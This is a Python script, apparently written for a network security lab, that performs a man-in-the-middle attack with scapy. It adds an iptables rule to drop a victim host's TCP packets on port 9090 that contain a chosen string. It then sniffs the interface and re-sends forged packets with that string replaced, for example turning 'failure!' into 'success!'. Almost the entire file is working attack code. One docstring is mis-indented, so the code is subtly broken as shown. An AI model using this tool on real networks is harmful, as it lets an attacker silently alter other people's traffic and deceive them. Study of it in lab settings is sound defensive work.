# @author: Abdelaziz Neamatallah
# @date: 10.05.2025

# file name is mitm_spoofer.py
#!/usr/bin/env python3 -> tells bash to use python for excuting the script
import argparse # used to parse the command line arguments
from scapy.all import * # used for ICMP redirection
import subprocess

# --- Argument Parsing ---
'''
Creating command line interface with 
    --src or -s which defines the source address to filter
    --find or -f to find certain pattern
    -r or --replace to replace it with new pattern.
example usage: 
    python3 modify.py -s 10.9.0.5 -f "failure!" -r "success!"
'''
parser = argparse.ArgumentParser(description="MITM Packet Modifier")
parser.add_argument("-s", "--src", required=True, help="Source IP address to filter")
parser.add_argument("-f", "--find", required=True, help="Pattern to find in payload")
parser.add_argument("-r", "--replace", required=True, help="Pattern to replace it with")
args = parser.parse_args()


# Your drop rule -> because we need to drop the packets sent from the victim, and then send only our new crafted packets.
iptables_cmd = [
    "iptables",
    "-A", "FORWARD",
    "-s", args.src, # source ip
    "-p", "tcp", # the used protocol
    "--dport", "9090", # the listening port
    "-m", "string",
    "--string", args.find, # string to be replaced
    "--algo", "kmp",
    "-j", "DROP"
]


# excuting this command
# iptables -A FORWARD -s 10.9.0.5 -p tcp --dport 9090 -m string --string findString --algo kmp -j DROP
try:
    subprocess.run(iptables_cmd, check=True)
    print(f"[+] iptables rule added to drop original packets containing: {args.find}")
except subprocess.CalledProcessError as e:
    print(f"[!] Failed to add iptables rule: {e}")



# --- Convert inputs to bytes ---
FIND = args.find.encode()
REPLACE = args.replace.encode()
SRC_IP = args.src

# --- Enforce same length or pad if shorter ---
if len(REPLACE) != len(FIND):
    if len(REPLACE) < len(FIND):
        REPLACE = REPLACE.ljust(len(FIND), b' ')  # pad with spaces
        print(f"[!] REPLACE padded: {REPLACE}")
    else:
        print("[!] ERROR: --replace is longer than --find, TCP stream would break.")
        exit(1)

# ensure that the script is running by showing some messages on the console
print("[*] MITM Packet Modifier Running...")
print(f"    Filtering packets from {SRC_IP}")
print(f"    Replacing: {FIND} -> {REPLACE}")

# --- Packet Interception and Modification ---
def spoof_pkt(pkt):
'''
    this function will be excuted on recieving any **pkt**.
    it is responsible for modifying the packets which contains failure! to contain success.


'''
    if pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt[IP].src == SRC_IP:
        if pkt[TCP].payload:
            data = pkt[TCP].payload.load

            if FIND in data:
                print(f"[+] Intercepted packet with data: {data}")

                # Replace the pattern
                newdata = data.replace(FIND, REPLACE)

                # Build new packet
                newpkt = IP(bytes(pkt[IP]))
                del(newpkt.chksum)
                del(newpkt[TCP].payload)
                del(newpkt[TCP].chksum)

                # Send modified packet
                send(newpkt / newdata)
                print("[+] Modified and sent new packet")
            else:
                print("[-] No target string found.")
        else:
            print("[-] TCP packet with no payload.")
    else:
        pass  # not from target source IP or no IP/TCP

# --- Start Sniffing ---
sniff(iface="eth0", filter="tcp", prn=spoof_pkt)


